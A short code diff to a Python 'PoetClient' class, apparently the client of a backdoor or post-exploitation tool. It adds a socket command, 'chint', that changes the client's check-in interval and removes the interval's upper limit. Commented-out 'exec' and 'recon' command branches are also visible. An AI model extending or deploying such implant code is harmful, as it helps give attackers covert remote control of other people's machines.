@@ -72,6 +72,10 @@ class PoetClient(object):
                         sys.exit()
                     except Exception as e:
                         self.s.send(str(e.message))
+                elif inp.startswith('chint'):
+                    found = True
+                    self.chint(self.s, inp)
+
                 # elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                 #     s.send(self.execute(inp))
                 # elif inp == 'recon':
@@ -186,8 +190,8 @@ class PoetClient(object):
         else:
             # set interval to arg
             try:
-                num = int(inp[6:])
-                if num < 1 or num > 60*60*24:
+                num = int(inp.split()[1])
+                if num < 1:
                     msg = 'Invalid interval time.'
                 else:
                     args.interval = num
